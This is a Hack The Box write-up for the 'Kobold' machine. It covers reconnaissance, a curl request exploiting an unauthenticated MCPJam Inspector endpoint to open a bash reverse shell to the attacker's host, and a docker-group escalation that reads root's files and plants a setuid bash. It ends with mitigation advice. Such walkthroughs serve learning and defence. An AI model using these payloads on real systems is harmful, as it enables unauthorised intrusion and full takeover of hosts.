<p align="center">
  <img src="https://img.shields.io/badge/Platform-HackTheBox-green?style=for-the-badge&logo=hackthebox" alt="HackTheBox" />
  <img src="https://img.shields.io/badge/OS-Linux-orange?style=for-the-badge&logo=linux" alt="OS Linux" />
  <img src="https://img.shields.io/badge/Difficulty-Easy-yellow?style=for-the-badge" alt="Easy Difficulty" />
</p>

# Kobold Notes

## Step 1 - Reconnaissance

```bash
nmap -A -sS -P -T4  --min-rate 5000 10.129.12.117
```

```text
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-03-22 12:58 UTC
Nmap scan report for 10.129.12.117
Host is up (0.23s latency).
Not shown: 997 closed tcp ports (reset)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 8c:45:12:36:03:61:de:0f:0b:2b:c3:9b:2a:92:59:a1 (ECDSA)
|_  256 d2:3c:bf:ed:55:4a:52:13:b5:34:d2:fb:8f:e4:93:bd (ED25519)
80/tcp  open  http     nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to https://kobold.htb/
|_http-server-header: nginx/1.24.0 (Ubuntu)
443/tcp open  ssl/http nginx 1.24.0 (Ubuntu)
| ssl-cert: Subject: commonName=kobold.htb
| Subject Alternative Name: DNS:kobold.htb, DNS:*.kobold.htb
| Not valid before: 2026-03-15T15:08:55
|_Not valid after:  2125-02-19T15:08:55
| tls-alpn: 
|   http/1.1
|   http/1.0
|_  http/0.9
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_ssl-date: TLS randomness does not represent time
|_http-title: Did not follow redirect to https://kobold.htb/
```

> — Aahaa! 443 as well! good.

> — Well there is nothing, no subdomains, no sub directories, literally nothing!

```bash
gobuster vhost -u http://kobold.htb -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-20000.txt --append-domain -t 50
```

```text
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:             http://kobold.htb
[+] Method:          GET
[+] Threads:         50
[+] Wordlist:        /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-20000.txt
[+] User Agent:      gobuster/3.6
[+] Timeout:         10s
[+] Append Domain:   true
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
Progress: 19966 / 19967 (99.99%)
===============================================================
Finished
```

```bash
python3 dirsearch.py -u "https://kobold.htb/" -x 404  
```

```text
  _|. _ _  _  _  _ _|_    v0.4.3                 
 (_||| _) (/_(_|| (_| )                          
                                                 
Extensions: php, asp, aspx, jsp, html, htm
HTTP method: GET | Threads: 25
Wordlist size: 12294

Target: https://kobold.htb/

[13:00:36] Scanning:                             
[13:02:32] 200 -    4KB - /index.html

Task Completed
```

> — After looking at some hints and research, i understood that, its something related kobold ai

* What is KoboldAI/KoboldCPP? KoboldAI is a browser-based front-end for AI-assisted writing and text generation. It typically runs on port 5000 or 8000.

> — also there is one subdomain as well 

* mcp.kobold.htb: MCP stands for Model Context Protocol - this is a protocol for AI model interactions, often used with:
  * KoboldAI (a text generation AI interface)
  * LLM (Large Language Model) servers
  * AI model management platforms

> — the reason why didn't saw it in the gobuster is because the wordlist is old and does not contains new ai related subdomains.

> — While looking at the subdomain its a MCP jam inspector 

* What is MCPJam Inspector?
  * A tool for developing/debugging MCP servers (AI model servers)
  * By default, it listens on 0.0.0.0 (all network interfaces) instead of 127.0.0.1 (localhost only)
  * This means it's accessible remotely

> — while looking for some know vulnerabilities for this, i have found 

* The RCE Vulnerability (CVE-2026-23744):
  * The `/api/mcp/connect` endpoint accepts a `serverConfig` object that includes:
    * `command`: What program to run
    * `args`: Arguments to pass to that program
    * `env`: Environment variables
  * The flaw: No validation is performed on these fields. An attacker can send ANY command, and the server will execute it!

> — Hence we got all we need, lets grab the initial foothold.

## Step 2 - Initial Foothold

> — we can write a bash command that will bind a reverse shell back to our machine

> — Setup a listener

> — then curl

```bash
curl -k -X POST "https://mcp.kobold.htb/api/mcp/connect" \
  -H "Content-Type: application/json" \
  -d '{
    "serverConfig": {
      "command": "/bin/bash",
      "args": ["-c", "bash -i >& /dev/tcp/10.10.14.11/4444 0>&1"],
      "env": {}
    },
    "serverId": "exploit"
  }'
```

> — on the listener!

```bash
nc -lvnp 4444
```

```text
listening on [any] 4444 ...
connect to [10.10.14.11] from (UNKNOWN) [10.129.12.117] 54016
bash: cannot set terminal process group (1529): Inappropriate ioctl for device
bash: no job control in this shell
ben@kobold:/usr/local/lib/node_modules/@mcpjam/inspector$ 
```

> — its ben, so go grab the user flag from, ben's directory

## Step 3 - Privilege Escalation 

> — i saw that, on the container we can run, docker commands.

> — It will allow us to mount the whole filesystem into a container, then we can access any file from that container

> — How to do it?

```bash
newgrp docker
docker run -v /:/hostfs --rm --user root --entrypoint cat privatebin/nginx-fpm-alpine:2.0.2 /hostfs/root/root.txt
```

* `-v /:/hostfs` - Mounts the entire host filesystem to `/hostfs` inside the container
* `--rm` - Removes container after execution
* `--user root` - Runs as root inside the container
* `--entrypoint cat` - Overrides the default entrypoint to use cat
* `privatebin/nginx-fpm-alpine:2.0.2` - The Docker image being used
* `/hostfs/root/root.txt` - The file to read

```text
ben@kobold:/usr/local/lib/node_modules/@mcpjam/inspector$ newgrp docker
docker run -v /:/hostfs --rm --user root --entrypoint cat privatebin/nginx-fpm-alpine:2.0.2 /hostfs/root/root.txtnewgrp docker

cc9acf6bd57c6d1caa7dfe72453554d2
```

> — this way you can directly read the whole file system without even gaining any privileges.

> — If aren't satisfied enough with getting a flag, and you wanna gain a shell, then--->

```bash
newgrp docker
docker run -v /:/hostfs --rm --user root --entrypoint sh privatebin/nginx-fpm-alpine:2.0.2 -c "cp /hostfs/bin/bash /hostfs/tmp/rootbash && chmod +s /hostfs/tmp/rootbash"
/tmp/rootbash -p
```

> — while i was trying this shell copy thing, it was taking to long and got stuck in between, maybe cause of my low main memory. 

> — made it work though!

```text
ben@kobold:/usr/local/lib/node_modules/@mcpjam/inspector$ newgrp docker
newgrp docker
$ ls
	LICENSE
	README.md
	assets
	bin
	dist
	node_modules
	package.json
$ docker run -v /:/hostfs --rm --user root --entrypoint sh privatebin/nginx-fpm-alpine:2.0.2 -c "cp /hostfs/bin/bash /hostfs/tmp/rootbash && chmod +s /hostfs/tmp/rootbash"
$ ls
	LICENSE
	README.md
	assets
	bin
	dist
	node_modules
	package.json
$ /tmp/rootbash -p
$ ls
	LICENSE
	README.md
	assets
	bin
	dist
	node_modules
	package.json
# whoami
root
```

> — i have used indentation and ls just to let myself know that i am still in the container or not, because i was seeing nothing, complete blank. and got scared! that's why had to use ls as a test to reassure!

## Mitigation & Security Perspective

> [!CAUTION]
> **CVE-2026-23744 - Unauthenticated RCE in MCPJam Inspector**
> MCPJam Inspector exposing the `/api/mcp/connect` endpoint to 0.0.0.0 without validation allows arbitrary command execution.
> **Mitigation:** Ensure that development/debugging tools bind exclusively to `127.0.0.1` and are placed behind a reverse proxy that enforces authentication (e.g., mTLS, Basic Auth) when external access is required. Regularly update to versions where the `serverConfig` parameters (`command`, `args`, `env`) are strictly sanitized or whitelisted.

> [!WARNING]
> **Docker Group Privilege Escalation**
> Members of the `docker` group can trivialy escalate to root by mounting the host filesystem into a privileged container.
> **Mitigation:** 
> 1. Avoid adding untrusted or standard users (like `ben`) to the `docker` group.
> 2. Implement Rootless Docker whenever possible to map the container's root to an unprivileged user on the host.
> 3. Enforce strict AppArmor or SELinux profiles to restrict what containers can mount or modify on the host filesystem.
